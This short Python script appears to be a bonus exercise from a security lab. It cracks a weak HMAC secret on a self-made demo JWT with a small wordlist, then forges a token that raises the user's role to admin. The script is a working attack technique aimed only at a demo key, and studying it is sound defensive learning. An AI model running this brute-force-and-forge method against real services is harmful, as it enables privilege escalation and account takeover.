"""Bonus: brute-force a weak HMAC secret offline (demo key, NOT data.SECRET)."""
import hmac, hashlib, json
from supplychain import b64

h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64(json.dumps({"user": "alice", "role": "user"}).encode())
weak_key = b"admin"                                   # the weak demo key
sig = b64(hmac.new(weak_key, f"{h}.{p}".encode(), hashlib.sha256).digest())

wordlist = [b"password", b"123456", b"secret", b"qwerty", b"admin"]
for guess in wordlist:
    if b64(hmac.new(guess, f"{h}.{p}".encode(), hashlib.sha256).digest()) == sig:
        print("cracked weak secret:", guess.decode())
        forged_p = b64(json.dumps({"user": "alice", "role": "admin"}).encode())
        forged_sig = b64(hmac.new(guess, f"{h}.{forged_p}".encode(), hashlib.sha256).digest())
        print("valid admin token minted:", f"{h}.{forged_p}.{forged_sig}"[:60] + "...")
        break
